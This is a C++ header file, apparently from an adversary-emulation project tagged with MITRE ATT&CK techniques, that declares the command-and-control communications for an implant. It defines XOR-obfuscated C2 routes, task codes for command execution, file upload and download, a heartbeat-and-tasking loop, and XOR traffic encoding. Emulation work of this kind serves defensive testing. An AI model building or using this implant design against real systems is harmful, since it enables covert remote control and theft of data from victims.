#pragma once
#ifndef __COMMS_H__
#define __COMMS_H__

#include <string>
#include <iostream>
#include <vector>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <chrono>
#include <thread>

#include "json.hpp"
#include "XorLogger.hpp"
#include "base64.hpp"
#include "settings.hpp"
#include "core.hpp"
#include "xor_string.hpp"

namespace Communication {

    const int RESP_BUFFER_SIZE = 1024;
    const std::string TASK_ROUTE = XOR_LIT("/request/");
    const std::string RESPONSE_ROUTE = XOR_LIT("/form/");
    const std::string UPLOAD_ROUTE = XOR_LIT("/submit");
    const std::string DOWNLOAD_ROUTE = XOR_LIT("/files/");

    const int HEARTBEAT_ID = 0;
    const int CMD_EXECUTION_ID = 1;
    const int DOWNLOAD_ID = 2;
    const int UPLOAD_ID = 3;

    namespace HTTP {

        class Response {
            public:
                std::string protocol;
                std::string status;
                int id = -1;
                std::string arg;
                std::string payload;
                std::vector<unsigned char> file_bytes;
                int file_size;
        };

        // SendRequest
        //      About:
        //          Creates an HTTP request of the given type to the given
        //          route with an optional filename (for uploads/downloads)
        //          and the given data then sends the HTTP request using raw
        //          TCP sockets to Communication::Settings::C2_ADDRESS at port
        //          80.
        //      Result:
        //          GET or POST request sent with the provided data, response
        //          and response_length are updated accordingly with the HTTP
        //          response from the C2 server
        //      Returns:
        //          void
        //      ATT&CK Techniques:
        //          T1071.001 Application Layer Protocol: Web Protocols
        std::vector<unsigned char> SendRequest(const char * type, std::string route, std::string filename, std::string data);

        // ParseHTTPRequest
        //      About:
        //          Parses the HTTP protocol, status, and body from the
        //          provided HTTP request
        //      Result:
        //          Creates a Response object containing the HTTP protocol,
        //          status code and message (i.e. 200 OK, 404 File Not Found),
        //          and HTTP response body from the provided response_vector
        //      Returns:
        //          Response containing the HTTP response from the C2 server
        Communication::HTTP::Response ParseHTTPResponse(std::vector<unsigned char> response_vector, bool is_file);

    }

    // C2CommsLoop
    //      About:
    //          Main loop performing registration with C2, heartbeats, and tasking
    //      Result:
    //          Sends POST request containing discovery information to C2 for
    //          registration. Sends GET requests for heartbeats. On receipt of
    //          tasking, performs tasking and sends POST requests containing
    //          output. Sleeps between each iteration.
    //      Returns:
    //          void
    void C2CommsLoop(std::string discovery_info);

    // XorCryptToString
    //      About:
    //          Converts the vector to a string, XORing each unsigned char with "F" (0x46)
    //      Result:
    //          Each unsigned char within the vector is XOR'd with "F" (0x46) to avoid null bytes
    //      Returns:
    //          string containing the XOR encrypted vector
    std::string XorCryptToString(std::vector<unsigned char> input);

    // XorCryptToVector
    //      About:
    //          Converts the string to a vector, XORing each char with "F" (0x46)
    //      Result:
    //          Each char within the string is XOR'd with "F" (0x46) to avoid null bytes
    //      Returns:
    //          vector of unsigned char containing the XOR encrypted string
    std::vector<unsigned char> XorCryptToVector(std::string input);

}

#endif